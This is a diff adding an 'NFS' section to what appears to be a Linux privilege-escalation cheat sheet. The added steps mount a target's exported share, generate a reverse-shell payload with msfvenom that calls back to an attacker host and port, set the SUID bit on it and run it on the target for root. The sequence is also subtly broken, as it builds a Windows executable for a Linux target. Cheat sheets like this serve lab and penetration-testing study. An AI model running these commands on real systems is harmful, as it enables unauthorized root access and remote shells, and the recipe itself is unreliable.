@@ -75,6 +75,19 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 ![LInux_ssh_root_key](https://user-images.githubusercontent.com/55708909/92305037-0328cc80-efa1-11ea-91fa-64e04110d947.png)
 
+17- NFS:
+
+    cat /etc/exports 
+    
+    On your machine be root and make a directory nfs for mounting 
+    cd /tmp
+    mkdir nfs
+    mount -o rw,vers=2 10.10.148.67:/tmp /tmp/nfs
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.1 LPORT=4444 -f exe > shell.exe
+    chmod +xs /tmp/nfs/shell.exe
+    transfer it to target machine
+    
+    On target machine run : /tmp/shell.exe  and you are root
 
 
 
